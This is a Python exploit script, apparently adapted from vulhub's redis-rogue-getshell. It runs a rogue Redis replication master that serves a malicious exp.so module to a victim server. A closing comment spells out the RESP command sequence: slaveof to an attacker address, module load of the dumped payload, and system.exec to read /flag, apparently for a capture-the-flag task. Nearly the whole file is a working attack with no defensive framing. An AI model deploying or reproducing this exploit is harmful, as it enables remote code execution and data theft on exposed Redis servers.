# -*- coding: utf-8 -*-
"""
-------------------------------------------------
   File Name :      rogue
   Description :    https://github.com/vulhub/redis-rogue-getshell
   Author :         x3nny
   date :           2021/6/30
-------------------------------------------------
   Change Activity:
                    2021/6/30: Init
-------------------------------------------------
"""
__author__ = 'x3nny'

import os
import sys
import argparse
import socketserver
import logging
import socket
import time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='>> %(message)s')

DELIMITER = b"\r\n"

class RoguoHandler(socketserver.BaseRequestHandler):
    def decode(self, data):
        if data.startswith(b'*'):
            return data.strip().split(DELIMITER)[2::2]
        if data.startswith(b'$'):
            return data.split(DELIMITER, 2)[1]

        return data.strip().split()

    def handle(self):
        while True:
            data = self.request.recv(1024)
            logging.info("receive data: %r", data)
            arr = self.decode(data)
            if arr[0].startswith(b'PING'):
                self.request.sendall(b'+PONG' + DELIMITER)
            elif arr[0].startswith(b'REPLCONF'):
                self.request.sendall(b'+OK' + DELIMITER)
            elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'):
                self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER)
                self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                break

        self.finish()

    def finish(self):
        self.request.close()


class RoguoServer(socketserver.TCPServer):
    allow_reuse_address = True

    def __init__(self, server_address, payload):
        super(RoguoServer, self).__init__(server_address, RoguoHandler, True)
        self.payload = payload


if __name__=='__main__':
    expfile = 'exp.so'
    lport = 6379
    with open(expfile, 'rb') as f:
        server = RoguoServer(('0.0.0.0', lport), f.read())
    server.handle_request()


'''
*2
$4
AUTH
$4
root
*1
$7
COMMAND
*3
$7
slaveof
$12
xxx.xx.xx.xx
$4
8998
*3
$6
module
$4
load
$10
./dump.rdb
*2
$11
system.exec
$9
cat /flag
*1
$4
quit
'''